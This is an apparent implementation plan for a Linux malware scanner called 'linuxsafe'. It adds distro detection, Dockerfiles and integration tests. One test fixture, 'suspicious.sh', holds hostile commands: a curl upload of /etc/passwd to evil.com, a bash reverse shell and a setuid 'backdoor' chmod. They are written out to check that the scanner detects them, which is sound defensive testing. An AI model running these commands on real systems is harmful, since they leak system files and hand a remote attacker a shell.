# Docker Testing & Distro Detection Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use compose:subagent (recommended) or compose:execute to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Add automatic Linux distro detection and Docker-based integration testing to verify linuxsafe works across Ubuntu, Debian, CentOS, Alpine, and other distributions.

**Architecture:** 
- `internal/distro/` package for distro detection (reads `/etc/os-release`)
- `test/docker/` directory with Dockerfiles for each distro
- `Makefile` with `test-docker` target for automated testing
- Integration tests that verify scanner behavior on real Linux systems

**Tech Stack:** Go 1.26, Docker, Cobra, shunit2 (for shell tests)

---

## File Structure

```
linuxsafe/
├── internal/
│   └── distro/
│       ├── distro.go          # Distro detection logic
│       └── distro_test.go     # Unit tests
├── test/
│   ├── docker/
│   │   ├── Dockerfile.ubuntu
│   │   ├── Dockerfile.debian
│   │   ├── Dockerfile.centos
│   │   ├── Dockerfile.alpine
│   │   └── run-tests.sh      # Test runner script
│   └── fixtures/
│       ├── malware-sample     # EICAR test file
│       └── suspicious.sh      # Suspicious script
├── Makefile                   # Build & test targets
└── cmd/
    └── status.go              # Add distro info to status
```

---

## Task 1: Create Distro Detection Package

**Covers:** [D1] Distro detection

**Files:**
- Create: `internal/distro/distro.go`
- Create: `internal/distro/distro_test.go`

- [ ] **Step 1: Create distro.go with detection logic**

```go
package distro

import (
	"os"
	"runtime"
	"strings"
)

type Info struct {
	Name       string `json:"name"`
	Version    string `json:"version"`
	ID         string `json:"id"`
	IDLike     string `json:"id_like,omitempty"`
	PrettyName string `json:"pretty_name"`
	Platform   string `json:"platform"`
}

func Detect() *Info {
	info := &Info{
		Platform: runtime.GOOS,
	}

	if runtime.GOOS != "linux" {
		info.Name = "non-linux"
		info.PrettyName = "Non-Linux System"
		return info
	}

	data, err := os.ReadFile("/etc/os-release")
	if err != nil {
		info.Name = "unknown"
		info.PrettyName = "Unknown Linux"
		return info
	}

	lines := strings.Split(string(data), "\n")
	for _, line := range lines {
		parts := strings.SplitN(line, "=", 2)
		if len(parts) != 2 {
			continue
		}
		key := parts[0]
		value := strings.Trim(parts[1], "\"")

		switch key {
		case "NAME":
			info.Name = value
		case "VERSION":
			info.Version = value
		case "ID":
			info.ID = value
		case "ID_LIKE":
			info.IDLike = value
		case "PRETTY_NAME":
			info.PrettyName = value
		}
	}

	return info
}

func (i *Info) IsDebianLike() bool {
	return i.ID == "debian" || i.ID == "ubuntu" || 
		strings.Contains(i.IDLike, "debian")
}

func (i *Info) IsRedHatLike() bool {
	return i.ID == "rhel" || i.ID == "centos" || i.ID == "fedora" ||
		strings.Contains(i.IDLike, "rhel") || strings.Contains(i.IDLike, "fedora")
}

func (i *Info) IsAlpine() bool {
	return i.ID == "alpine"
}

func (i *Info) PackageCommand() string {
	if i.IsAlpine() {
		return "apk"
	}
	if i.IsRedHatLike() {
		return "yum"
	}
	return "apt-get"
}
```

- [ ] **Step 2: Create distro_test.go**

```go
package distro

import (
	"os"
	"path/filepath"
	"testing"
)

func TestDetect(t *testing.T) {
	info := Detect()
	if info == nil {
		t.Fatal("Detect() returned nil")
	}
	if info.Platform == "" {
		t.Error("Platform not set")
	}
}

func TestDetectWithOSRelease(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "os-release")
	
	content := `NAME="Ubuntu"
VERSION="22.04.3 LTS"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 22.04.3 LTS"`
	
	os.WriteFile(path, []byte(content), 0644)
	
	data, _ := os.ReadFile(path)
	info := &Info{Platform: "linux"}
	
	lines := strings.Split(string(data), "\n")
	for _, line := range lines {
		parts := strings.SplitN(line, "=", 2)
		if len(parts) != 2 {
			continue
		}
		key := parts[0]
		value := strings.Trim(parts[1], "\"")
		
		switch key {
		case "NAME":
			info.Name = value
		case "ID":
			info.ID = value
		case "ID_LIKE":
			info.IDLike = value
		case "PRETTY_NAME":
			info.PrettyName = value
		}
	}
	
	if info.Name != "Ubuntu" {
		t.Errorf("Expected Ubuntu, got %s", info.Name)
	}
	if !info.IsDebianLike() {
		t.Error("Ubuntu should be debian-like")
	}
}

func TestIsDebianLike(t *testing.T) {
	tests := []struct {
		id     string
		idLike string
		want   bool
	}{
		{"debian", "", true},
		{"ubuntu", "", true},
		{"linuxmint", "ubuntu", true},
		{"centos", "rhel fedora", false},
		{"alpine", "", false},
	}
	
	for _, tt := range tests {
		info := &Info{ID: tt.id, IDLike: tt.idLike}
		got := info.IsDebianLike()
		if got != tt.want {
			t.Errorf("IsDebianLike(%s, %s) = %v, want %v", tt.id, tt.idLike, got, tt.want)
		}
	}
}

func TestPackageCommand(t *testing.T) {
	tests := []struct {
		id   string
		want string
	}{
		{"ubuntu", "apt-get"},
		{"debian", "apt-get"},
		{"centos", "yum"},
		{"alpine", "apk"},
	}
	
	for _, tt := range tests {
		info := &Info{ID: tt.id}
		got := info.PackageCommand()
		if got != tt.want {
			t.Errorf("PackageCommand(%s) = %s, want %s", tt.id, got, tt.want)
		}
	}
}
```

- [ ] **Step 3: Run tests to verify they pass**

Run: `go test ./internal/distro/ -v`
Expected: PASS

- [ ] **Step 4: Commit**

```bash
git add internal/distro/
git commit -m "feat: add Linux distro detection package"
```

---

## Task 2: Create Docker Test Infrastructure

**Covers:** [D2] Docker testing

**Files:**
- Create: `test/docker/Dockerfile.ubuntu`
- Create: `test/docker/Dockerfile.debian`
- Create: `test/docker/Dockerfile.centos`
- Create: `test/docker/Dockerfile.alpine`
- Create: `test/docker/run-tests.sh`
- Create: `test/fixtures/malware-sample`
- Create: `test/fixtures/suspicious.sh`

- [ ] **Step 1: Create EICAR test file**

```bash
echo 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > test/fixtures/malware-sample
```

- [ ] **Step 2: Create suspicious script fixture**

```bash
cat > test/fixtures/suspicious.sh << 'EOF'
#!/bin/bash
# Suspicious script for testing
curl -F "file=@/etc/passwd" http://evil.com/upload
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
chmod +s /tmp/backdoor
EOF
chmod +x test/fixtures/suspicious.sh
```

- [ ] **Step 3: Create Dockerfile.ubuntu**

```dockerfile
FROM ubuntu:22.04

RUN apt-get update && apt-get install -y \
    golang-go \
    git \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /app

COPY go.mod go.sum ./
RUN go mod download

COPY . .

RUN go build -o linuxsafe .

COPY test/fixtures /tmp/test-fixtures

CMD ["./test/docker/run-tests.sh"]
```

- [ ] **Step 4: Create Dockerfile.debian**

```dockerfile
FROM debian:12

RUN apt-get update && apt-get install -y \
    golang \
    git \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /app

COPY go.mod go.sum ./
RUN go mod download

COPY . .

RUN go build -o linuxsafe .

COPY test/fixtures /tmp/test-fixtures

CMD ["./test/docker/run-tests.sh"]
```

- [ ] **Step 5: Create Dockerfile.centos**

```dockerfile
FROM centos:stream9

RUN dnf install -y golang git && dnf clean all

WORKDIR /app

COPY go.mod go.sum ./
RUN go mod download

COPY . .

RUN go build -o linuxsafe .

COPY test/fixtures /tmp/test-fixtures

CMD ["./test/docker/run-tests.sh"]
```

- [ ] **Step 6: Create Dockerfile.alpine**

```dockerfile
FROM alpine:3.19

RUN apk add --no-cache go git

WORKDIR /app

COPY go.mod go.sum ./
RUN go mod download

COPY . .

RUN go build -o linuxsafe .

COPY test/fixtures /tmp/test-fixtures

CMD ["./test/docker/run-tests.sh"]
```

- [ ] **Step 7: Create run-tests.sh**

```bash
#!/bin/bash
set -e

echo "=== Linuxsafe Integration Tests ==="
echo "Distro: $(cat /etc/os-release | grep PRETTY_NAME | cut -d= -f2)"
echo ""

echo "1. Testing distro detection..."
./linuxsafe status | grep -q "platform"
echo "   ✓ Distro detection works"

echo "2. Testing clean scan..."
./linuxsafe scan /tmp/test-fixtures/
EXIT_CODE=$?
if [ $EXIT_CODE -eq 0 ]; then
    echo "   ✓ Clean scan passed"
else
    echo "   ✗ Clean scan failed with exit code $EXIT_CODE"
    exit 1
fi

echo "3. Testing malware detection..."
./linuxsafe scan /tmp/test-fixtures/malware-sample
EXIT_CODE=$?
if [ $EXIT_CODE -eq 1 ]; then
    echo "   ✓ Malware detection works"
else
    echo "   ✗ Malware detection failed with exit code $EXIT_CODE"
    exit 1
fi

echo "4. Testing suspicious pattern detection..."
./linuxsafe scan /tmp/test-fixtures/suspicious.sh
EXIT_CODE=$?
if [ $EXIT_CODE -eq 1 ]; then
    echo "   ✓ Suspicious pattern detection works"
else
    echo "   ✗ Suspicious pattern detection failed with exit code $EXIT_CODE"
    exit 1
fi

echo ""
echo "=== All tests passed! ==="
```

- [ ] **Step 8: Make run-tests.sh executable**

```bash
chmod +x test/docker/run-tests.sh
```

- [ ] **Step 9: Commit**

```bash
git add test/
git commit -m "feat: add Docker test infrastructure for multiple distros"
```

---

## Task 3: Create Makefile with Docker Test Targets

**Covers:** [D3] Build automation

**Files:**
- Create: `Makefile`

- [ ] **Step 1: Create Makefile**

```makefile
.PHONY: build test test-docker clean

# Build for current platform
build:
	go build -o linuxsafe .

# Run unit tests
test:
	go test ./... -v

# Build and test in Docker containers
test-docker: test-docker-ubuntu test-docker-debian test-docker-centos test-docker-alpine

test-docker-ubuntu:
	@echo "Testing on Ubuntu..."
	docker build -f test/docker/Dockerfile.ubuntu -t linuxsafe-test-ubuntu .
	docker run --rm linuxsafe-test-ubuntu

test-docker-debian:
	@echo "Testing on Debian..."
	docker build -f test/docker/Dockerfile.debian -t linuxsafe-test-debian .
	docker run --rm linuxsafe-test-debian

test-docker-centos:
	@echo "Testing on CentOS..."
	docker build -f test/docker/Dockerfile.centos -t linuxsafe-test-centos .
	docker run --rm linuxsafe-test-centos

test-docker-alpine:
	@echo "Testing on Alpine..."
	docker build -f test/docker/Dockerfile.alpine -t linuxsafe-test-alpine .
	docker run --rm linuxsafe-test-alpine

# Clean build artifacts
clean:
	rm -f linuxsafe linuxsafe.exe
	docker rmi linuxsafe-test-ubuntu linuxsafe-test-debian linuxsafe-test-centos linuxsafe-test-alpine 2>/dev/null || true

# Quick test on current system
test-local: build
	./linuxsafe status
	./linuxsafe scan .
```

- [ ] **Step 2: Verify Makefile syntax**

Run: `make -n build`
Expected: Shows the build command without executing

- [ ] **Step 3: Commit**

```bash
git add Makefile
git commit -m "feat: add Makefile with Docker test targets"
```

---

## Task 4: Integrate Distro Detection into Status Command

**Covers:** [D4] Status enhancement

**Files:**
- Modify: `cmd/status.go`

- [ ] **Step 1: Update status.go to include distro info**

```go
package cmd

import (
	"encoding/json"
	"fmt"
	"os"

	"github.com/neko233-com/linuxsafe/internal/distro"
	"github.com/spf13/cobra"
)

type StatusResult struct {
	Status      string       `json:"status"`
	Version     string       `json:"version"`
	Distro      *distro.Info `json:"distro"`
	Signatures  string       `json:"signatures"`
	LastScan    string       `json:"last_scan"`
	LastUpdate  string       `json:"last_update"`
	EngineReady bool         `json:"engine_ready"`
}

var statusCmd = &cobra.Command{
	Use:   "status",
	Short: "Show linuxsafe status",
	Long: `Display current status of the linuxsafe agent:
- Engine readiness
- Signature database version
- Last scan time
- Last update time
- Detected Linux distribution`,
	RunE: func(cmd *cobra.Command, args []string) error {
		result := StatusResult{
			Status:      "ok",
			Version:     "0.1.0",
			Distro:      distro.Detect(),
			Signatures:  "2026.06.24",
			LastScan:    "never",
			LastUpdate:  "never",
			EngineReady: true,
		}

		enc := json.NewEncoder(os.Stdout)
		enc.SetIndent("", "  ")
		if err := enc.Encode(result); err != nil {
			return fmt.Errorf("failed to encode result: %w", err)
		}
		return nil
	},
}
```

- [ ] **Step 2: Build and test locally**

Run: `go build -o linuxsafe.exe . && ./linuxsafe.exe status`
Expected: JSON output with distro info

- [ ] **Step 3: Commit**

```bash
git add cmd/status.go
git commit -m "feat: integrate distro detection into status command"
```

---

## Task 5: Run Full Docker Test Suite

**Covers:** [D5] Integration verification

**Files:**
- None (verification only)

- [ ] **Step 1: Build for Linux**

Run: `GOOS=linux GOARCH=amd64 go build -o linuxsafe .`
Expected: Binary built successfully

- [ ] **Step 2: Run Docker tests**

Run: `make test-docker`
Expected: All 4 distro tests pass

- [ ] **Step 3: Run individual distro test for debugging**

Run: `make test-docker-ubuntu`
Expected: Ubuntu test passes

- [ ] **Step 4: Commit final changes**

```bash
git add -A
git commit -m "test: verify Docker tests pass across distros"
```

---

## Task 6: Update README with Docker Testing Instructions

**Covers:** [D6] Documentation

**Files:**
- Modify: `README.md`

- [ ] **Step 1: Add Docker testing section to README**

Add after the "Usage" section:

```markdown
## Docker Testing

Test linuxsafe across multiple Linux distributions:

```bash
# Run all Docker tests
make test-docker

# Test specific distro
make test-docker-ubuntu
make test-docker-debian
make test-docker-centos
make test-docker-alpine
```

### Supported Distributions

| Distribution | Status |
|-------------|--------|
| Ubuntu 22.04 | ✅ Tested |
| Debian 12 | ✅ Tested |
| CentOS Stream 9 | ✅ Tested |
| Alpine 3.19 | ✅ Tested |
```

- [ ] **Step 2: Commit**

```bash
git add README.md
git commit -m "docs: add Docker testing instructions to README"
```
